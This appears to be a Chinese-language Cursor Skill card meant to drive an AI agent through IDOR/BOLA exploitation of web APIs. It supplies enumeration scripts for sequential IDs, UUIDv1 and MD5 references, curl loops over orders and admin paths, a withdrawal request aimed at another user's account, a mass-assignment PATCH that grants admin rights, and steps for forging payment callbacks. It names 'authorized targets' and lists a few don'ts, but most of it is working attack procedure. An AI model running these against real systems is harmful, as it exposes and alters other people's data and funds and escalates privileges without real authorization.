---
name: 万我·横夺
description: >-
 授权目标上 IDOR/BOLA（越权读/写）完整攻击链：ID 枚举（顺序/UUID/哈希）、
 对象矩阵交叉验证、参数污染越权、间接对象引用、批量对象泄露、
 嵌套对象越权、支付/订单 IDOR。
 
 FastAdmin 走 fastadmin-shop-tenant-bola；GVA 走 ginvue-admin-stealth-takeover。
 资金面 `wallet_id` / 双路径 / 展示层地址 / 幽灵单走 `fund-edge-ops`。
 旧名 `api-security` / `api-sec` / `api-security-testing` / `api-authorization-and-bola` 已并入本卡。垂直越权走 `rbac-bypass-authz`。
---

> **东方长凡**
> 万我出手千身同，一念分身遍北原。
> 智海无边身作舟，长凡不凡我即天。

# IDOR / BOLA 越权利用链（Cursor Skill）

## 何时用

- 对象 ID 直接暴露在 URL / 请求体（`/api/orders/12345`、`user_id=456`）
- API 文档或 JS 中发现直接对象引用
- 注册后可见自己的数据，怀疑可读他人数据
- 修改自己的 `profile`/`account`/`order` 时，试更换 `id` 是否影响他人

---

## 1. 快速指纹（对象矩阵思路）

```
对象类型：用户资料 / 订单 / 支付 / 消息 / 文件 / 配置
操作：读(GET) / 写(POST/PUT/PATCH) / 删(DELETE) / 管理配置(PUT admin)

先注册两个账号 A（自己控制）和 B（也是自己注册），
用 A 的 token 读 B 的资源 → 水平越权
用普通用户 token 访问 admin 接口 → 垂直越权

### 双会话字段级差分（BOLA 确认）

同一资源各打一遍，对 JSON **逐字段 diff**，不要只看 HTTP 200：

```
GET /api/orders/B的订单  + Token-A
GET /api/orders/B的订单  + Token-B   ← 本底
GET /api/orders/B的订单  + 无票      ← 负对照
```

- A 能看到 B 的邮箱/余额/地址 → 水平读确认
- A 改 B 的字段且 B 再 GET 变化 → 水平写确认
- 低权票打到高权字段（`role`/`shop_id`/`is_admin`）→ 交接 `rbac-bypass-authz` / `mass-assignment`
- GraphQL 用 alias / node(id) 重复上述差分，走 `graphql-pentest`
```

---

## 2. 枚举策略

### 2.1 顺序 ID 枚举

```python
#!/usr/bin/env python3
"""枚举 /api/orders/{id} 看哪些不是自己的"""
import httpx, sys, time

TARGET = sys.argv[1] # https://目标
TOKEN_A = sys.argv[2] # 账号A的token
MY_ID = int(sys.argv[3]) if len(sys.argv) > 3 else 0 # 自己的对象ID

headers = {"Authorization": f"Bearer {TOKEN_A}"}

# 枚举周围的 ID
for oid in range(max(1, MY_ID - 20), MY_ID + 30):
 if oid == MY_ID:
 continue
 r = httpx.get(f"{TARGET}/api/orders/{oid}", headers=headers, timeout=5)
 if r.status_code == 200:
 data = r.json()
 print(f"[!] IDOR! id={oid} user={data.get('user_id','?')} amount={data.get('amount','?')}")
 elif r.status_code not in (403, 404, 401):
 print(f"[?] id={oid} status={r.status_code}")
 time.sleep(0.1)
```

### 2.2 UUID 枚举（版本 1：时间戳可预测）

```python
import uuid, datetime

# UUIDv1 包含时间戳，可以枚举目标注册时间前后的 UUID
def gen_uuid_range(base_uuid_str, count=100):
 base = uuid.UUID(base_uuid_str)
 base_int = base.int
 uuids = []
 for delta in range(-count, count):
 u = uuid.UUID(int=base_int + delta * (2**32))
 uuids.append(str(u))
 return uuids

# 用自己的 UUIDv1 生成附近的 UUID
for u in gen_uuid_range("YOUR-UUID-HERE", 50):
 print(u)
```

### 2.3 可预测哈希（MD5/SHA1 of user ID）

```python
import hashlib

# 如果对象引用是 md5(user_id)
for uid in range(1, 1000):
 h = hashlib.md5(str(uid).encode()).hexdigest()
 print(f"{uid}: {h}")

# 对照目标中已知的哈希值，反推 user_id 范围
```

---

## 3. 参数位置枚举

```bash
# URL 路径参数
GET /api/users/456/profile # 改 456 为其他用户ID
GET /api/files/abc123/download # 改文件ID

# 查询参数
GET /api/orders?user_id=456
GET /api/messages?recipient=789

# 请求体参数
POST /api/profile/update
{"user_id": 456, "email": "..."} # 改 user_id

# HTTP Header
X-User-ID: 456
X-Account-ID: 789

# Cookies
user_id=456 (Cookie) # 直接改 Cookie
```

```bash
# 批量测试脚本
for param in user_id uid account_id userId accountId member_id pid cid; do
 echo "测试参数: $param"
 curl -s -H "Authorization: Bearer $TOKEN" \
 "https://目标/api/profile?${param}=1" | python3 -c "
import sys,json
try:
 d=json.load(sys.stdin)
 if 'user' in str(d).lower() or 'email' in str(d).lower():
 print(' [!] 发现敏感数据:', list(d.keys()))
except: pass"
done
```

---

## 4. 嵌套对象越权

```bash
# 访问 A 的订单时，其中的 buyer.profile 是否也暴露完整信息
GET /api/orders/12345
# 响应：{"id":12345, "buyer":{"id":456, "email":"victim@...", "phone":"..."}}

# 二级对象访问
GET /api/orders/12345/buyer
GET /api/users/456/orders # 列出他人所有订单
```

---

## 5. 支付/金融 IDOR 专项

```bash
# 订单 ID 枚举
for i in $(seq 20240101001 20240101100); do
 r=$(curl -s -o /dev/null -w "%{http_code}" \
 -H "Authorization: Bearer $TOKEN" \
 "https://目标/api/orders/$i")
 [ "$r" = "200" ] && echo "命中: $i"
done

# 支付回调伪造（结合 IDOR）
# 1. 找到自己的订单 trade_no
# 2. 找到他人的 trade_no（通过 IDOR 枚举）
# 3. 伪造支付回调，让对方的订单状态改变

# 提现 IDOR
curl -s -X POST \
 -H "Authorization: Bearer $TOKEN_A" \
 -H "Content-Type: application/json" \
 -d '{"amount":1000,"account_id":456}' \ # 456 是 B 的账户
 https://目标/api/withdraw

# wallet_id 才是资金对象键（uid 阴性不准结案）
# A 票 + B wallet_id → 地址/余额/流水
python3 炼蛊房/fund_edge_ops_probe.py wallet-swap \
  --base https://目标 --case <案卷> \
  --token-a "$TOKEN_A" --wallet-b "$WALLET_B"
```

`user_id` 校验通过但 `wallet_id` 不校验、或 `/wallet/*` 与 `/fund/*` 鉴权不对称 → 立刻交 `fund-edge-ops`。消息/工单回单号当 IDOR oracle 也走那张，不要只枚举 `/orders`。

---

## 6. 批量对象泄露（BFLA）

```bash
# 列表接口是否泄露所有用户数据
GET /api/users # 管理员接口，普通用户能访问吗？
GET /api/orders # 所有订单
GET /api/transactions?page=1&limit=100

# GraphQL 批量枚举
POST /graphql
{"query":"{ users { id email phone balance } }"}

# 响应过滤测试：是否有 "total_count" 泄露数量
```

---

## 7. 垂直越权（低权限 → 管理员）

```bash
# 测试管理员接口
for path in /admin /api/admin /api/v1/admin /dashboard/admin \
 /api/users/list /api/config /api/settings/global \
 /api/user/1/make-admin /api/role/update; do
 r=$(curl -s -o /dev/null -w "%{http_code}" \
 -H "Authorization: Bearer $USER_TOKEN" \
 "https://目标$path")
 [ "$r" = "200" ] && echo "[!] 越权访问: $path"
done

# PUT/PATCH role 字段（Mass Assignment 场景）
curl -s -X PATCH \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"role":"admin","isAdmin":true,"authorityId":888}' \
 https://目标/api/user/profile
```

---

## 8. 与对象矩阵结合

```
填写 案卷/object_matrix.md：
 行：自控用户A / 低权限用户 / 未登录
 列：读他人资料 / 写他人资料 / 提升权限 / 访问支付
 
 已验证 → √
 阴性（禁止直接结案）→ 换格子/换参数位置继续
```

---

## 9. FastAdmin Shop 专项（注意 GT-filter）

```bash
# EQ 改 shop_id 是阴性不等于没有隔离漏洞
# 必须测 GT/IN/LIKE 操作符
python3 炼蛊房/fastadmin_shop_tenant_probe.py \
 --base https://目标 --case <案卷> \
 --shop-id 1 --probe-op GT,IN,LIKE,NE
```

详见 `fastadmin-shop-tenant-bola`。

---

## 10. 成功口径

| 级别 | 描述 |
|------|------|
| L1 | 确认参数可控且影响他人对象（400/404 → 200 变化） |
| L2 | 成功读取其他用户的私人数据（邮箱/手机/余额/订单） |
| L3 | 成功修改/删除他人数据，或实现垂直越权拿管理员权限 |

---

## 11. 不要做

- 批量枚举大量真实用户数据（只取少量证明即可）
- 对未授权对象执行提款/删除操作
- 用 IDOR 枚举他人支付信息做实际损害

---

## 真源

- 手法：`传承/春秋蝉·分案.md`
- 工具：`python3 炼蛊房/idor_swap_probe.py --base https://授权站 --case <案卷>`
- 资金对象键 / 双路径 / 展示层：`杀招/血神子·锋` · `fund_edge_ops_probe.py`
- FastAdmin 专项：`杀招/快府·横夺`
- 对象矩阵：`案卷/object_matrix.md` · `python3 炼蛊房/object_matrix.py check --case <案卷>`
